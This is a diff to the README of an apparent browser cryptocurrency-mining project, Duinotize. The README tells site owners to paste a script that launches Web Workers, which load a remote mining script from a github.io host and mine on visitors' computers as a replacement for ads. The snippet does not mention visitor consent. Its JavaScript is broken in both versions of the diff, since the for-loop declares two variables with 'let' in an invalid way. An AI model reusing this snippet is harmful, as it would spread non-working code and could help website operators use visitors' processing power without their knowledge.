@@ -7,8 +7,8 @@ Tired of showing users ads? Don't want to leak personal info to use Adsense? Use
 Put the following code at the very bottom of the HTML page(s) you want the miner to run on:
 ```
 <script>
-    let threads = 1; 
-    for (let workerVer = 0; let workersAmount = 0; workersAmount < threads; workersAmount++) {
+    let workerVer = 0;
+    for (let threads = 1; let workersAmount = 0; workersAmount < threads; workersAmount++) {
         let socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/duinotize.js");
         socketWorker.postMessage('Start,' + "username" + "," + "duinotize-rig" + "," + "difficulty" + "," + workerVer);
         workerVer++;
